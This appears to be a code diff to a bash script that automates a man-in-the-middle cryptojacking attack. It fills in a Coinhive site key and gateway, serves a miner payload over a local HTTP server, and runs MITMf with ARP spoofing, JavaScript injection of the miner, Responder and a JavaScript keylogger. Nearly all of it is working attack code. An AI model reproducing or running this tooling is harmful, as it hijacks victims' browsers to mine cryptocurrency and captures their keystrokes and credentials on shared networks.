@@ -145,22 +145,24 @@ start-coinhive(){
 #https://coinhive.com/settings/sites #Email: i1123977@nwytg.com #public-site-key: FUq2rCkflht7xM7o3RB8t6W2SyMutCNY
 #https://coin-hive.com/lib/coinhive.min.js #Miner js file
 #Public-site-key from: https://coinhive.com/settings/sites
- PUB_SITE_KEY=""
- gateway=""
+ PUB_SITE_KEY="FUq2rCkflht7xM7o3RB8t6W2SyMutCNY"
+ gateway="10.0.0.1"
 
 #Restart networking service
 echo -e "$txtgrn [*] Restarting networking service $endclr"
  /etc/init.d/networking restart
 
 if [ -z $gateway ]; then
-  read -t 3 -p "[?] Wheres your gateway?(e.g 192.168.2.254|192.168.0.1|10.0.0.1) [>]" ans; echo ""
+  echo ""
+  read -p "[?] Wheres your gateway?(e.g 192.168.2.254|192.168.0.1|10.0.0.1) [>]" gateway
 fi
-echo -e "$txtgrn [*] Using gateway: $gateway $endclr"
+echo -e "$txtgrn [*] Using gateway: $gateway $endclr \n"
 
 if [ -z $PUB_SITE_KEY ]; then
-  read -t 3 -p "[?] What is your Coinhive Public-Site-Key [>]" ans; echo ""
+  echo ""
+  read -p "[?] What is your Coinhive Public-Site-Key [>]" PUB_SITE_KEY
 fi
-echo -e "$txtgrn [*] Using Coinhive Public Site Key: $PUB_SITE_KEY $endclr"
+echo -e "$txtgrn [*] Using Coinhive Public Site Key: $PUB_SITE_KEY $endclr \n"
 
 echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
@@ -195,21 +197,21 @@ IP_ADDR_HEX="$(printf '%02X' $(echo ${IP_ADDR//./ }) ; echo)"
 #Place local hexed-ip in miner.js
  sed -i "s|.*script src.*|<script src=\"http://0x$IP_ADDR_HEX/$payload_random\"</script>|g" $share/coinhive-js/miner.js
 
-#Start http-server for serving payload
-echo -e "$txtgrn [*] Starting httpyserver for serving payload: $payload_random $endclr"
- cd $share/coinhive-js/ && xterm -hold -T "Httpyserver" -e python3 -m http.server 80 &
-
 #Make logdir to stop complains of MITMf
 mkdir -p /tmp/MITMf_logs/logs
 cd /tmp/MITMf_logs/
 
 #Ask for extra addons
 read -p "[?] Use extra addons for MITMf?(y/n) [>]" -n1 -t 5 ans
- if [ $ans = "" ];then
-  echo -e "$txtred [*] Executing MITMf w/o extra addons $endclr"
+ if [ -z $ans ] ;then
+  echo -e "\n $txtred [*] Executing MITMf w/o extra addons $endclr"
   ans="no"
  fi
-echo -e "$txtgrn [*] MITMf logs can be found in: /tmp/MITMf_logs/logs $endclr"
+#Start http-server for serving payload
+echo -e "$txtgrn [*] Starting httpyserver for serving payload: $payload_random $endclr"
+ cd $share/coinhive-js/ && xterm -hold -T "Httpyserver" -e python3 -m http.server 80 &
+
+echo -e "\n $txtgrn [*] MITMf logs can be found in: /tmp/MITMf_logs/logs $endclr"
 echo -e "$txtgrn [*] Starting MITMf.. $endclr"
  case $ans in
   y|Y|Yes|yes|YES) $share/MITMf/./mitmf.py -i $upstream --inject --js-file $share/coinhive-js/miner.js --arp --spoof --gateway $gateway --screen --browserprofiler --responder --analyze --jskeylo$ ;;
